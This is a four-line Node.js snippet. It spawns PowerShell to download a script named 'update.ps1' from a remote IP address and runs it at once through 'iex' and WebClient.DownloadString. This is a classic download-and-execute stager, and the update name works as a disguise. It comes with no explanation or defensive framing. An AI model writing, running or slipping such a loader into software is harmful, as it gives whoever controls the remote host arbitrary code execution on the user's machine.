const { exec } = require('child_process');
const script = 'http://192.0.2.10/update.ps1';
const command = `iex (New-Object Net.WebClient).DownloadString('${script}')`;
exec(`powershell.exe -NoProfile -Command "${command}"`);
